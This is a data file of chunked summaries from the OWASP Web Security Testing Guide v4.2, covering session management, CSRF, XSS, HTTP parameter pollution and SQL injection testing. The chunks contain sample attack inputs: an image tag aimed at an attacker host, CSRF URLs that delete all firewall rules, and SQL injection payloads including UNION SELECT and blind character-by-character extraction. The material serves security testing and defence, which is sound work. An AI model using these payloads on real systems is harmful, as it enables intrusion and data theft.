cookies.\n__Host- prefix requirements: Must have Secure attribute, be set from secure URI, cannot have Domain, and must use Path=/.\n__Secure- prefix: Indicates cookie must have Secure attribute and be set from secure URI.\nSecure cookie best practice configuration: `Set-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict`.\nUnderstand the importance of setting cookie attributes for security and user session management.\nReferences to relevant tools for web security testing, including OWASP Zed Attack Proxy, Burp Suite, Tamper Data, FireSheep, and browser plug-ins like EditThisCookie and Cookiebro."}
{"id": "WSTGv4_2-00080", "source": "wstg-v4.2_knowledge.json", "start_item": 1412, "end_item": 1426, "text": "f setting cookie attributes for security and user session management.\nReferences to relevant tools for web security testing, including OWASP Zed Attack Proxy, Burp Suite, Tamper Data, FireSheep, and browser plug-ins like EditThisCookie and Cookiebro.\nCitations of important RFCs regarding HTTP and cookies, including RFC 2965, RFC 2616, and draft-ietf-httpbis-cookie-same-site-00.\nDiscussion on the importance of the 'expires' attribute of Set-Cookie for managing session cookies.\nMention of HttpOnly Session ID in URL and Page Body, indicating security implications for session handling.\nSession fixation is a vulnerability caused by preserving session cookie values before and after authentication.\nAttackers can exploit session fixation by obtaining session cookies before a victim logs in and using them to impersonate the victim during the session.\nRefreshing session cookies after authentication can mitigate the risk of session fixation.\nEnsuring the integrity of session cookies can prevent this type of attack, especially when using full HSTS and specific cookie prefixes like __Host- or __Secure-.\nTest objectives include analyzing the authentication mechanism, forcing cookies, and assessing impact for vulnerabilities.\nA testing strategy begins by making a request to the target site, such as www.example.com, and examining the response to analyze session cookie settings.\nThe application generates a session identifier (JSESSIONID) for the client after authentication.\nSuccessful authentication is demonstrated with a specific POST request to 'authentication.php'.\nAn example POST request is provided, showing necessary headers and the body content containing user credentials.\nThe server response confirms authentication with a 200 OK status and includes various headers.\nThe lack of a new cookie after successful authentication poses a risk for session hijacking, indicating that integrity of the session cookie must be ensured.\nA testing strategy called 'Forced Cookies' is presented, which targets vulnerabilities in sites without HSTS adoption."}
{"id": "WSTGv4_2-00081", "source": "wstg-v4.2_knowledge.json", "start_item": 1427, "end_item": 1444, "text": "fter successful authentication poses a risk for session hijacking, indicating that integrity of the session cookie must be ensured.\nA testing strategy called 'Forced Cookies' is presented, which targets vulnerabilities in sites without HSTS adoption.\nSteps for testing session fixation include saving cookies prior to login, logging in as a victim, and attempting to use those cookies to access the victim's account as an attacker.\nImportant steps for testing session fixation vulnerabilities in web applications:\n1. Identify the secure function to trigger.\n2. Clear cookies and login as the victim.\n3. Observe if the operation was successful in the victim's account to determine if the attack was successful.\nRecommendation to use different machines or browsers for victim and attacker to reduce false positives.\nShorter variant of testing strategy with only one account halting at step 6.\nRemediation strategy involves renewing the session token after user authentication and invalidating the existing session ID.\nTool recommended for testing is OWASP ZAP.\nExposed session tokens (Cookie, SessionID, Hidden Field) can lead to unauthorized access to applications.\nTransport security is crucial for protecting sensitive Session ID data during transmission between the client and application servers.\nA personal proxy can help gather information on protocol used (HTTP vs. HTTPS) and HTTP headers.\nSession ID data should be passed securely through GET or POST requests, ensuring the examination of protocol, cache, privacy directives, and message bodies.\nEncryption is vital to protect session tokens from eavesdropping, and it must be enforced for any request/response containing Session IDs.\nSeparate consideration should be given to encrypting the Session ID from the transport encryption for data it may represent.\nTesting for proper encryption and reuse of Session Tokens should ensure that encryption is a default, enforced for requests, and different Session IDs should be employed when transitioning between secure and non-secure sections of a site.\nA token should be sent via an encrypted channel for every HTTP request.\nProxies and caches must be considered in application security testing."}
{"id": "WSTGv4_2-00082", "source": "wstg-v4.2_knowledge.json", "start_item": 1445, "end_item": 1462, "text": "fferent Session IDs should be employed when transitioning between secure and non-secure sections of a site.\nA token should be sent via an encrypted channel for every HTTP request.\nProxies and caches must be considered in application security testing.\nSession IDs must never be sent over unencrypted transport or cached.\nEnforced encrypted communications are critical for Session ID transfer.\nHTTP/1.1 provides various cache control mechanisms to prevent Session ID caching.\nCache-Control directives such as 'no-cache', 'private', 'max-age=0', and 'Expires: 0' are vital in managing cache exposure.\nGET requests are discouraged for passing Session IDs due to potential exposure in logs and simplicity of manipulation.\nPOST requests are preferred for sensitive data transfer to mitigate risks of Cross-site Scripting (XSS).\nServer-side code must be validated to ensure it does not accept GET data if it should only accept POST data.\nClients can potentially manipulate applications to send Session IDs unencrypted by shifting between HTTP and HTTPS.\nUnderstanding of cache-control directives and their application to requests/responses containing Session IDs.\nIdentification of situations where cache-control directives may not be consistently present.\nInsight into the use of GET requests that incorporate Session IDs.\nExploration of the interchangeability of POST and GET requests in the context of Session ID handling.\nReferences to relevant RFCs that detail HTTP state management and the HTTP/1.1 protocol.\nCross-Site Request Forgery (CSRF) is an attack that causes a user to perform unintended actions on an authenticated web application.\nSuccessful CSRF attacks can compromise user data or even the entire application if an administrator's account is targeted.\nCSRF exploits rely on the user's web browser behavior with session information, such as cookies and HTTP authentication.\nThe exploitation of CSRF requires knowledge of valid application URLs and requests by the attacker.\nThe presence of specific HTML tags can facilitate CSRF attacks but is not strictly required for the vulnerability itself."}
{"id": "WSTGv4_2-00083", "source": "wstg-v4.2_knowledge.json", "start_item": 1463, "end_item": 1480, "text": "ies and HTTP authentication.\nThe exploitation of CSRF requires knowledge of valid application URLs and requests by the attacker.\nThe presence of specific HTML tags can facilitate CSRF attacks but is not strictly required for the vulnerability itself.\nBrowsers automatically send session identification information (like cookies) with requests, which can be exploited by attackers in CSRF attacks.\nCertain vulnerabilities arise from applications that solely depend on browser-stored authentication data to manage user sessions.\nThe explanation includes how user sessions are maintained and managed in CSRF exploit scenarios.\nSession riding allows attackers to exploit authenticated sessions through GET requests.\nThere are various ways a GET request can be sent by an authenticated user: using the web application, typing the URL directly, or following external malicious links.\nEmbeddable techniques can disguise the properties of a link and pose security threats, especially in emails or third-party content.\nAttackers can use HTML tags like <img> to trigger unintended actions on a web application without user awareness.\nBrowsers do not differentiate between legitimate and illegitimate image requests, leading to potential vulnerabilities.\nImage: img_page203_1.png\nHTML content can refer to components in a web application regardless of their location.\nHTML requests can be automatically composed by the browser, allowing attackers to exploit vulnerabilities.\nEmails can trigger requests to web applications through hidden image references.\nExample of an image tag exploited by an attacker: `<img src='https://[attacker]/picture.gif' width='0' height='0'>`\nAttackers can redirect victims' requests to their malicious sites using image URLs.\nWeb applications relying solely on HTTP authentication are vulnerable to this type of attack, as the browser sends authentication information automatically.\nExample of a vulnerable action in a firewall web management console: deleting a rule with GET requests:\nTo delete a specific rule: `https://[target]/fwmgt/delete?rule=1` is an example, while deleting all rules can be done with `https://[target]/fwmgt/delete?rule=*`.\nImage: img_page204_1.png"}
{"id": "WSTGv4_2-00084", "source": "wstg-v4.2_knowledge.json", "start_item": 1481, "end_item": 1496, "text": "all web management console: deleting a rule with GET requests:\nTo delete a specific rule: `https://[target]/fwmgt/delete?rule=1` is an example, while deleting all rules can be done with `https://[target]/fwmgt/delete?rule=*`.\nImage: img_page204_1.png\nThe page discusses vulnerabilities associated with session riding in firewall management applications.\nA GET request can lead to significant security breaches by deleting critical firewall rules if not properly secured.\nAn example URL that could cause a major security issue is `https://www.company.example/fwmgt/delete?rule=*`, which would delete all firewall rules.\nThese vulnerabilities can be exploited even within the safety of a firewall, as long as the compromised link is reachable by the victim user.\nSelf-vulnerable applications, like web mail, can be exploited as both an attack vector and a target, allowing attackers to perform unauthorized actions.\nTesting objectives include determining if requests can be initiated on behalf of users without their initiation, indicating session management vulnerabilities.\nSession management vulnerabilities can occur if the application solely relies on client-side values, such as cookies and HTTP authentication credentials.\nResources accessible via HTTP GET requests are generally more vulnerable, but POST requests can also be targeted through JavaScript.\nImage: img_page205_1.png\nCSRF (Cross-Site Request Forgery) vulnerabilities are a type of security risk.\nA sample HTML form is provided for exploiting CSRF vulnerabilities using a self-submitting form.\nThe HTML code showcases how to create a form that submits a POST request to a target website using hidden input fields.\nFor applications that use JSON for communication, a specific payload format is necessary that accommodates the lack of query parameters in JSON.\nChanging the encoding type to 'text/plain' allows the JSON payload to be sent correctly during CSRF attack simulations.\nA specific format for the POST request and payload is outlined, demonstrating how they can be structured to exploit CSRF vulnerabilities.\nRemediation strategies involve consulting the OWASP CSRF Prevention Cheat Sheet to mitigate these vulnerabilities."}
{"id": "WSTGv4_2-00085", "source": "wstg-v4.2_knowledge.json", "start_item": 1497, "end_item": 1508, "text": "specific format for the POST request and payload is outlined, demonstrating how they can be structured to exploit CSRF vulnerabilities.\nRemediation strategies involve consulting the OWASP CSRF Prevention Cheat Sheet to mitigate these vulnerabilities.\nTools such as OWASP ZAP, CSRF Tester, and Pinata-csrf-tool are mentioned as resources for detecting and testing CSRF vulnerabilities.\nSession termination is crucial for the session lifecycle and helps prevent session hijacking attacks.\nA secure session termination should include user interface controls for manual logout, session timeout, and proper invalidation of server-side session state.\nCommon issues in session termination include unclear log out buttons and the client-side session token being reused while server-side state remains active.\nWeb applications should handle browser closures by terminating sessions automatically after a defined period of inactivity.\nSingle sign-on (SSO) systems often lead to multiple sessions that require independent termination, and logging out of an application doesn't necessarily affect the SSO session.\nTesting for Log Out User Interface includes verifying visibility and accessibility of log out functionality across the web application.\nA good log out UI should have a log out button on all pages, quickly identifiable, visible without scrolling, and ideally fixed in the viewport.\nTesting for Server-Side Session Termination involves checking if session cookies are appropriately invalidated after log out and ensuring no authenticated data is accessible post-logout.\nTesting for Session Timeout involves measuring how long an authenticated session lasts before session termination occurs, with an ideal timeout balancing security and usability.\nFor web applications integrated with Single Sign-On (SSO), logging out of the SSO should force log out from all connected applications, requiring re-authentication to access any authenticated areas.\nBurp Suite - Repeater is a recommended tool for conducting these tests."}
{"id": "WSTGv4_2-00086", "source": "wstg-v4.2_knowledge.json", "start_item": 1509, "end_item": 1523, "text": " integrated with Single Sign-On (SSO), logging out of the SSO should force log out from all connected applications, requiring re-authentication to access any authenticated areas.\nBurp Suite - Repeater is a recommended tool for conducting these tests.\nTesting Session Timeout refers to verifying that applications automatically log out users after a period of inactivity to safeguard against session reuse and sensitive data exposure.\nAll applications should have an idle timeout for user sessions, balancing security and usability based on the sensitivity of the data (e.g., 15 minutes for banking, 60 minutes for public forums).\nSession timeout management must be enforced on the server side to prevent manipulation by attackers through client-controlled parameters like cookies.\nIf session tokens are not properly invalidated upon logout, an attacker can exploit this to impersonate a legitimate user through cookie replay attacks.\nCommon scenarios for session attacks include using public computers without logging out, potentially allowing unauthorized access to sensitive accounts.\nTesting for session timeout functionality is similar to testing log out functionality.\nTesters need to check whether a timeout exists by logging in and waiting for the timeout to occur.\nAll session tokens should be destroyed or rendered unusable after a timeout.\nUnderstanding whether a timeout is enforced by the client or the server is essential.\nIf a session cookie does not store time-related data, the timeout is likely enforced by the server.\nTesters can modify the session cookie to check for vulnerabilities if it is not cryptographically protected.\nProper checks on session state should be in place to prevent replay of destroyed session identifiers.\nSession invalidation should occur server-side to prevent access with old session cookies.\nCrucial methods for invalidating sessions include HttpSession.invalidate() in Java and Session.abandon() in .NET.\nSession Variable Overloading is a type of application vulnerability allowing attackers to impersonate users or escalate privileges."}
{"id": "WSTGv4_2-00087", "source": "wstg-v4.2_knowledge.json", "start_item": 1524, "end_item": 1538, "text": "ies.\nCrucial methods for invalidating sessions include HttpSession.invalidate() in Java and Session.abandon() in .NET.\nSession Variable Overloading is a type of application vulnerability allowing attackers to impersonate users or escalate privileges.\nThis vulnerability occurs when the same session variable is used for multiple purposes, enabling unexpected access patterns.\nAn attacker can exploit session variable overloading to bypass authentication and access privileged locations in the application.\nTesting for this vulnerability requires identifying all session variables and understanding their context of use.\nBlack-box testing is a challenging method for detecting this vulnerability, as it involves enumerating session variables without internal knowledge of the application.\nAn example of this vulnerability is a password recovery page populating the session with user-provided information, which can be leveraged to access private data.\nGray-Box Testing is emphasized as an effective method for detecting vulnerabilities.\nThe most effective way to detect vulnerabilities is through a source code review.\nSession variables should only be used for a single consistent purpose.\nSession hijacking is when an attacker gains access to user session cookies to impersonate the user.\nTo prevent session hijacking, session cookies should be marked with the Secure attribute, ensuring they are only communicated over HTTPS.\nEven if a web application is fully deployed over HTTPS, session cookies should still be marked as Secure to prevent cookie theft attacks.\nAn attack scenario demonstrates how cookies can be leaked over HTTP when not marked with Secure, allowing an attacker to hijack sessions.\nHTTP Strict Transport Security (HSTS) can prevent session hijacking by banning the use of HTTP, but full HSTS adoption is critical when session cookies are issued with the Domain attribute set.\nFull HSTS adoption requires activation for the host and its sub-domains; partial activation only secures the host itself.\nCookies with the Domain attribute set can be shared across sub-domains, making them vulnerable if full HSTS is not implemented across all sub-domains."}
{"id": "WSTGv4_2-00088", "source": "wstg-v4.2_knowledge.json", "start_item": 1539, "end_item": 1555, "text": "uires activation for the host and its sub-domains; partial activation only secures the host itself.\nCookies with the Domain attribute set can be shared across sub-domains, making them vulnerable if full HSTS is not implemented across all sub-domains.\nThe testing strategy focuses on identifying vulnerable session cookies and assessing the risk from network attackers.\nSimulating an attack scenario involving cookie theft to demonstrate session hijacking risks.\nSteps to execute the test include logging in as a victim, manipulating cookies, and checking if the attack is successful.\nSpecific conditions for cookies that can be deleted: cookies with specific attributes based on HSTS adoption.\nUse two different machines or browsers to minimize false positives during testing.\nRecommended tools for conducting these tests include OWASP ZAP and JHijack.\nSection 4.7 focuses on Input Validation Testing in web security.\nThe guide covers various types of attacks including Cross-Site Scripting (XSS), SQL Injection, and Command Injection.\nSpecific tests are outlined for different databases such as Oracle, MySQL, SQL Server, PostgreSQL, and NoSQL.\nThe section includes methodologies for testing vulnerabilities such as LDAP Injection, XML Injection, and XPath Injection.\nCode snippets listed are relevant for security testing procedures.\nReflected Cross-Site Scripting (XSS) involves the injection of executable code within a single HTTP response, affecting users who open malicious links.\nReflected XSS is non-persistent and impacts only those who interact with the crafted URI or HTTP parameters.\nReflected XSS attacks are also referred to as first-order or type 1 XSS, as they are executed through single request-response transactions.\nAttackers leverage reflected XSS vulnerabilities to steal sensitive information, such as cookies, install key loggers, and alter web content.\nPreventing XSS vulnerabilities necessitates proper character encoding, as web applications may inadequately filter certain encoded characters.\nBlack-box testing involves detecting input vectors, analyzing those vectors for vulnerabilities, and testing using specially crafted input data."}
{"id": "WSTGv4_2-00089", "source": "wstg-v4.2_knowledge.json", "start_item": 1556, "end_item": 1574, "text": "itates proper character encoding, as web applications may inadequately filter certain encoded characters.\nBlack-box testing involves detecting input vectors, analyzing those vectors for vulnerabilities, and testing using specially crafted input data.\nTest inputs can reveal vulnerabilities in web applications by examining if they are executed without proper encoding.\nHTML special characters like >, <, &, ', and \" should be replaced with their HTML entities.\nWhen handling HTML and JavaScript contexts, characters like \\n, \\r, ', \", and \\ must be specifically encoded or filtered.\nTesters should scrutinize user inputs for XSS (Cross-site Scripting) vulnerabilities as they are common entry points for attacks.\nExample demonstrates a situation where a URL parameter is manipulated to trigger an XSS alert if not sanitized.\nImage: img_page220_1.png\nThe page discusses examples of Cross-Site Scripting (XSS) vulnerabilities in web applications.\nExample 1 demonstrates an XSS issue where a malicious link can execute arbitrary code in a user's browser.\nExample 2 provides a specific code example showing how a tester might exploit an XSS vulnerability using a crafted URL.\nA code snippet is provided showing how the link manipulates the document to redirect the user to download a malicious file.\nThe page includes a table that describes the effect of clicking the malicious link, specifying the consequences for users.\nThe section on bypassing XSS filters highlights various methods such as web application firewalls, input sanitization, and the assumption that browsers may not always prevent attacks.\nImage: img_page221_1.png\nImage: img_page221_2.png\nWeb application firewalls are not guaranteed to recognize all novel attacks, allowing crafted attack strings to bypass them.\nXSS prevention relies significantly on the sanitization of untrusted user input.\nSanitization mechanisms include returning an error, removing, encoding, or replacing invalid input.\nCommon weaknesses in preventing XSS include incomplete deny or allow lists, potential sanitization failures, and trusting unsanitized inputs.\nThe XSS Filter Evasion Cheat Sheet documents techniques for circumventing XSS filters."}
{"id": "WSTGv4_2-00090", "source": "wstg-v4.2_knowledge.json", "start_item": 1575, "end_item": 1590, "text": "lacing invalid input.\nCommon weaknesses in preventing XSS include incomplete deny or allow lists, potential sanitization failures, and trusting unsanitized inputs.\nThe XSS Filter Evasion Cheat Sheet documents techniques for circumventing XSS filters.\nExamples illustrate how attackers can exploit sanitization weaknesses, such as using JavaScript in attribute values, obfuscating attack syntax, or bypassing single-pass filtering.\nExample exploits include using variations of the script tag and URL encoding to bypass filters.\nCode snippets for security testing including PHP code and a decoupling method for regular expressions.\nDiscussion of reflected Cross-Site Scripting (XSS) vulnerabilities and potential bypass methods using special characters in scripts.\nIntroduction of HTTP Parameter Pollution (HPP) with an explanation of the technique and how it can be used to bypass security filters.\nExamples of regular and HPP attacks showcasing how to manipulate parameters to exploit vulnerabilities.\nMention of the XSS Filter Evasion Cheat Sheet as a resource for more evasion techniques.\nOverview of Gray-box testing which involves having partial knowledge about the application for more effective testing.\nPHP Charset Encoder (PCE) helps you encode arbitrary texts to and from 65 kinds of character sets for customized payloads.\nHackvertor is an online tool that allows various types of encoding and obfuscation of JavaScript (or any string input).\nXSS-Proxy is an advanced Cross-Site-Scripting (XSS) attack tool.\nratproxy is a semi-automated web application security audit tool that detects and annotates potential problems based on user traffic.\nBurp Proxy is an interactive HTTP/S proxy server for attacking and testing web applications.\nOWASP Zed Attack Proxy (ZAP) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.\nStored Cross-site Scripting (XSS) is the most dangerous type of XSS.\nStored XSS occurs when user input is collected and stored without proper filtering, making it executable in the user's browser."}
{"id": "WSTGv4_2-00091", "source": "wstg-v4.2_knowledge.json", "start_item": 1591, "end_item": 1610, "text": "and testing web applications with a built-in scanner.\nStored Cross-site Scripting (XSS) is the most dangerous type of XSS.\nStored XSS occurs when user input is collected and stored without proper filtering, making it executable in the user's browser.\nThis vulnerability can lead to various attacks like hijacking user sessions, capturing sensitive information, and conducting browser-based exploits.\nStored XSS can exploit any user, not requiring malicious links; it is executed when the victim visits a compromised page.\nThe attack follows several steps: an attacker stores malicious code, the user authenticates, and finally visits the vulnerable page where the code executes.\nTesting for stored XSS involves identifying stored input reflected on the client-side and assessing input acceptance and encoding returns.\nIdentify points of user input storage in applications like user profiles, shopping carts, file managers, settings, forums, blogs, and logs.\nUnderstand the context in which stored input is used in HTML and JavaScript.\nInvestigate out-of-band channels for user input storage distinct from reflected XSS.\nTest all administrative areas of applications for user-submitted data.\nExample of analyzing and testing input fields in a web application's HTML structure.\nThe necessity to inject code outside the input tags during testing for vulnerabilities like Stored XSS.\nImage: img_page226_1.jpeg\nCode examples demonstrating XSS payload injections in HTML.\nTesting input submission through applications with JavaScript disabled or using web proxies.\nThe importance of testing both HTTP GET and POST requests for XSS vulnerabilities.\nStored input can lead to execution of XSS payloads when reloading a page.\nTesting for XSS filtering techniques and evasion strategies.\nRecommendations for tools and resources related to XSS filter evasion like 'XSS Filter Evasion' and 'Mario XSS Cheat pages'.\nThe role of advanced JavaScript exploitation frameworks like BeEF in leveraging stored XSS attacks.\nA typical procedure for exploiting stored XSS via BeEF, including injecting a JavaScript hook and controlling the application user's browser.\nExample of a BeEF injection attack in an HTML context."}
{"id": "WSTGv4_2-00092", "source": "wstg-v4.2_knowledge.json", "start_item": 1611, "end_item": 1633, "text": "rameworks like BeEF in leveraging stored XSS attacks.\nA typical procedure for exploiting stored XSS via BeEF, including injecting a JavaScript hook and controlling the application user's browser.\nExample of a BeEF injection attack in an HTML context.\nImage: img_page227_1.jpeg\nWeb Security Testing Guide v4.2 discusses file upload vulnerabilities.\nHTML content can be injected into file uploads if the application permits it.\nPen-testers must check for arbitrary MIME type settings during file uploads.\nMIME type mishandling can lead to XSS attacks when unexpected content types are processed as HTML.\nExample of an HTTP POST request for file upload is provided in the context of testing file upload capabilities.\nImage: img_page228_1.png\nGray-box testing involves partial knowledge of the application by the pen-tester.\nIn gray-box testing, testers should check how user input is processed and stored.\nRecommended steps in gray-box testing are:\n1. Use front-end application and enter input with special/invalid characters.\n2. Analyze application response(s).\n3. Identify presence of input validation controls.\n4. Access back-end system to check input storage.\n5. Analyze source code for input rendering.\nThe code examples include techniques for analyzing common server-side languages: PHP, ASP, and JSP.\nSpecial variables/functions to look for in different programming languages include: PHP's $_GET and $_POST, ASP's Request.QueryString, and JSP's doGet and doPost.\nThe table summarizes several important server-side request handling variables and methods.\nTools for web security testing include: PHP Charset Encoder, Hackvertor, BeEF, XSS-Proxy, Burp Proxy, and XSS Assistant.\nThe OWASP Zed Attack Proxy (ZAP) is an interactive HTTP/S proxy server designed for attacking and testing web applications, with a built-in scanner.\nIt is important to reference various resources and books for further learning and understanding of web security, including:\n- 'Hacking Exposed Web Applications', a resource by Joel Scambray, Mike Shema, and Caleb Sima.\n- 'The Web Application’s Handbook - Discovering and Exploiting Security Flaws' by Dafydd Stuttard and Marcus Pinto."}
{"id": "WSTGv4_2-00093", "source": "wstg-v4.2_knowledge.json", "start_item": 1634, "end_item": 1649, "text": "derstanding of web security, including:\n- 'Hacking Exposed Web Applications', a resource by Joel Scambray, Mike Shema, and Caleb Sima.\n- 'The Web Application’s Handbook - Discovering and Exploiting Security Flaws' by Dafydd Stuttard and Marcus Pinto.\n- 'Cross Site Scripting Attacks: XSS Exploits and Defense', edited by Jeremiah Grossman and others.\nTesting for HTTP Verb Tampering\nID: WSTG-INPV-03\nThis content has been merged into: Test HTTP Methods\nTesting for HTTP Parameter Pollution involves sending multiple parameters with the same name in HTTP requests to observe application behavior.\nThe lack of standardization in current HTTP protocols, particularly how multiple parameters of the same name should be handled, poses risks for web applications.\nPresence of duplicated parameters can lead to anomalous behaviors in applications, which can be exploited if developers are unaware of these issues.\nHTTP Parameter Pollution (HPP) can be used to bypass security mechanisms like web application firewalls.\nReal-life examples of HPP include vulnerabilities in ModSecurity and Apple Cups, highlighting the risks when applications incorrectly handle duplicate parameters.\nIn the case of ModSecurity, an attacker can bypass filters by using multiple HTTP parameters that concatenate into a malicious query string after passing through security layers.\nHPP vulnerabilities can also lead to Cross-Site Scripting (XSS) attacks, as seen with the Apple Cups example.\nCritical vulnerabilities, such as those affecting platforms like Blogger, can allow unauthorized access to user accounts through crafted HTTP requests.\nWeb Security Testing Guide v4.2 discusses HTTP Parameter Pollution (HPP) and its implications on web security.\nAn example code snippet demonstrates an HTTP POST request with potential security vulnerabilities involving parameters.\nThe flaw is identified in the authentication mechanism where security checks do not align with actual parameter usage.\nThe expected behavior of various web technologies with multiple occurrences of the same HTTP parameter varies, with examples provided using different web servers and programming languages."}
{"id": "WSTGv4_2-00094", "source": "wstg-v4.2_knowledge.json", "start_item": 1650, "end_item": 1666, "text": "ere security checks do not align with actual parameter usage.\nThe expected behavior of various web technologies with multiple occurrences of the same HTTP parameter varies, with examples provided using different web servers and programming languages.\nTesting objectives include identifying backend systems, assessing injection points, and attempting to bypass input filters through HPP.\nManual testing is required to effectively test HPP since automatic tools may produce numerous false positives.\nTo test for HTTP Parameter Pollution (HPP) vulnerabilities, identify forms or actions that accept user-supplied input.\nQuery strings in HTTP GET requests can be modified directly in the browser's navigation bar.\nFor POST requests, an intercepting proxy is needed to manipulate the data before it's sent to the server.\nTo test for HPP, append a duplicate parameter with a different value to either GET or POST data.\nAnalyze the server response for how it handles duplicate parameters (first, last, both).\nThe behavior of handling parameters may indicate a potential security vulnerability.\nGeneral rule: if input validation is strong and the server handles single inputs correctly, it may not be vulnerable to parameter pollution.\nAn in-depth HPP analysis involves three distinct HTTP requests: standard parameters, tampered values, and a combination of both in one request.\nManual testing is essential to detect client-side parameter pollution vulnerabilities, similar to server-side HPP.\nClient-side attacks aim to subvert client-side components and technologies.\nTesting for HPP client-side vulnerabilities involves identifying user input forms that reflect input back to users, such as search pages.\nTo test for vulnerabilities, pollutants like `&HPP_TEST` should be inserted into HTTP parameters and the responses analyzed for occurrences.\nKey attributes to monitor for HPP vulnerabilities include `data`, `src`, `href`, and form actions.\nThe vulnerability's impact depends on specific input validation, filtering, and application business logic.\nClient-side vulnerabilities can also affect query string parameters in technologies such as XMLHttpRequest and Flash variables."}
{"id": "WSTGv4_2-00095", "source": "wstg-v4.2_knowledge.json", "start_item": 1667, "end_item": 1680, "text": " form actions.\nThe vulnerability's impact depends on specific input validation, filtering, and application business logic.\nClient-side vulnerabilities can also affect query string parameters in technologies such as XMLHttpRequest and Flash variables.\nSQL injection testing checks for vulnerabilities that allow data injection into SQL queries through user input without proper validation.\nSuccessful SQL injection attacks can read, modify, and manipulate database data and execute commands on the operating system.\nA SQL injection attack can consist of inserting either a partial or complete SQL query via user input.\nExample of a vulnerable SQL statement: `select title, text from news where id=$id` where `$id` contains user-supplied data.\nAn attacker can craft input like `10 or 1=1` to manipulate SQL logic and bypass restrictions.\nSQL injection attacks can be classified into three types: Inband, Out-of-band, and Inferential or Blind attacks.\nInband attacks extract data via the same channel used for injection; Out-of-band uses a different channel; Inferential or Blind does not transfer data but infers it through server responses.\nRecovering error message details can help attackers reconstruct the logic of an original SQL query.\nUnion Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.\nBoolean: use Boolean condition(s) to verify whether certain conditions are true or false.\nError based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.\nOut-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).\nTime delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.\nIdentify SQL injection points and assess the severity of the injection and the level of access that can be achieved through it."}
{"id": "WSTGv4_2-00096", "source": "wstg-v4.2_knowledge.json", "start_item": 1681, "end_item": 1696, "text": "onal queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.\nIdentify SQL injection points and assess the severity of the injection and the level of access that can be achieved through it.\nUnderstand when the application interacts with a DB Server to access data, including authentication forms, search engines, and e-commerce sites.\nThe tester must list all input fields whose values could be used in crafting a SQL query and test them separately to generate errors.\nThe very first test usually consists of adding a single quote ' or a semicolon ; to the field or parameter under test, leading to an incorrect query if not filtered by the application.\nComment delimiters ( -- or /* */ ) and other SQL keywords can also modify the query, potentially generating errors.\nImportance of full error messages in SQL injection testing.\nNeed for blind injection techniques when detailed error messages are not available.\nTesting each input field separately to identify vulnerabilities.\nExample of a classic SQL injection query using generic placeholders.\nInjection technique converting a SQL query for successful authentication through always-true conditions.\nExample of crafting a SQL injection payload using a hash function and handling comments in SQL.\nThe URL request to bypass authentication is structured in a way that the password is ignored due to the comment delimiter in the username value.\nThe method of limiting results in SQL can be exploited using the 'LIMIT' clause to force the output to exactly one result.\nThe tester can manipulate SQL queries by altering the input to evaluate logical operators (AND, OR) to test for vulnerabilities.\nAn example of a request that results in no content could indicate that the application is handling SQL queries in a way that could expose vulnerabilities.\nStacked queries allow for execution of multiple SQL commands in one call if the web application/API and DBMS support it.\nFingerprinting the database helps identify the specific DBMS being used for advanced SQL injection exploitation."}
{"id": "WSTGv4_2-00097", "source": "wstg-v4.2_knowledge.json", "start_item": 1697, "end_item": 1712, "text": "vulnerabilities.\nStacked queries allow for execution of multiple SQL commands in one call if the web application/API and DBMS support it.\nFingerprinting the database helps identify the specific DBMS being used for advanced SQL injection exploitation.\nErrors returned by the application can indicate the type of back-end database (e.g., MySQL, Oracle, MS SQL Server, PostgreSQL).\nExamples of error messages for different databases are provided, which can help identify the DBMS in use:\nMySQL error message example: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1`\nExample of a MySQL exploitation payload: ```SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1, 1```\nOracle error message example: `ORA-00933: SQL command not properly ended`\nMS SQL Server error message example: `Microsoft SQL Native Client error ‘80040e14’ Unclosed quotation mark after the character string`\nPostgreSQL error message example: `Query failed: ERROR: syntax error at or near \"’\" at character 56 in /www/site/test.php on line 121.`\nIf there are no error messages, testers may try different concatenation techniques for string fields.\nExamples of concatenation techniques: MySql: ‘test’ + ‘ing’, SQL Server: ‘test’ ‘ing’, Oracle: ‘test’||’ing’, PostgreSQL: ‘test’||’ing’.\nThe UNION operator is used in SQL injections to combine a test query with the original query to retrieve data from other tables.\nIncludes SQL injection vulnerability exploitation techniques, specifically using UNION SELECT statements.\nDemonstrates how to manipulate SQL queries to extract data from a database.\nExplains the necessity of matching the number of columns in a SQL UNION query to prevent syntax errors.\nDescribes the use of the ORDER BY clause to determine the number of columns returned by a SELECT statement.\nIncludes code examples demonstrating how to test for the presence of additional columns.\nIntroduces Boolean exploitation techniques for Blind SQL Injection scenarios, highlighting its use when no feedback is given upon query execution."}
{"id": "WSTGv4_2-00098", "source": "wstg-v4.2_knowledge.json", "start_item": 1713, "end_item": 1728, "text": "ECT statement.\nIncludes code examples demonstrating how to test for the presence of additional columns.\nIntroduces Boolean exploitation techniques for Blind SQL Injection scenarios, highlighting its use when no feedback is given upon query execution.\nThe method described is an inference method used to retrieve values from a database that is vulnerable to SQL injection.\nThis method involves forming a series of boolean queries and observing the server's responses to deduce the actual values of desired fields.\nAn example SQL injection query is provided: `http://www.example.com/index.php?id=1'` which causes a syntax error that suggests exploitation potential.\nThe SQL query being executed on the server is: `SELECT field1, field2, field3 FROM Users WHERE Id='$Id'` which can be exploited to extract usernames.\nThe technique extracts the username character by character using the pseudo-functions:\n1. `SUBSTRING (text, start, length)`: Returns a substring from 'text' starting from position 'start' with length 'length'.\n2. `ASCII (char)`: Returns the ASCII value of the character 'char'. Returns null if char is 0.\n3. `LENGTH (text)`: Returns the number of characters in 'text'.\nThe extraction process involves running queries like: `$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1` to determine if the first character of the username corresponds to the ASCII value of 97 (which is 'a').\nFor false value testing, a query of the form `$Id=1' AND '1' = '2` is used, which always yields a false response to compare against.\nChallenges in this method include correctly interpreting the server's response to distinguish between true and false values.\nDescribes the process of extracting templates from responses in SQL injection tests.\nHighlights the importance of determining termination conditions in inference 